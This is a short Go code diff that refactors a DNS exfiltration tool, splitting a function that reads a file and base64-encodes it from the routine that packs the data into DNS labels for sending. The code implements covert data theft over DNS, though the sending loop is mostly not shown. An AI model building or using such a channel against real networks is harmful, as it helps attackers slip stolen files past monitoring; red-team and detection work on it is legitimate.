@@ -40,18 +40,11 @@ func encodeToModifiedBase64(data []byte) string {
 	return strings.Replace(base64Data, "=", "-", -1)
 }
 
-func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
-	data, err := ioutil.ReadFile(filename)
-	if err != nil {
-		log.Fatalln(err)
-	}
-
-	encodedData := encodeToModifiedBase64(data)
-
+func (ex *dnsExfiltrator) exfiltrateData(encodedData string) {
 	// Domain names in messages are expressed in terms of a sequence of labels.
 	// Each label is represented as a one octet length field followed by that
-	// number of octets.  Since every domain name ends with the null label of
-	// the root, a domain name is terminated by a length byte of zero.  The
+	// number of octets. Since every domain name ends with the null label of
+	// the root, a domain name is terminated by a length byte of zero. The
 	// high order two bits of every length octet must be zero, and the
 	// remaining six bits of the length field limit the label to 63 octets or
 	// less.
@@ -89,4 +82,14 @@ func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
 			log.Fatalln(err)
 		}
 	}
+}
+
+func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
+	data, err := ioutil.ReadFile(filename)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	encodedData := encodeToModifiedBase64(data)
+	ex.exfiltrateData(encodedData)
 }
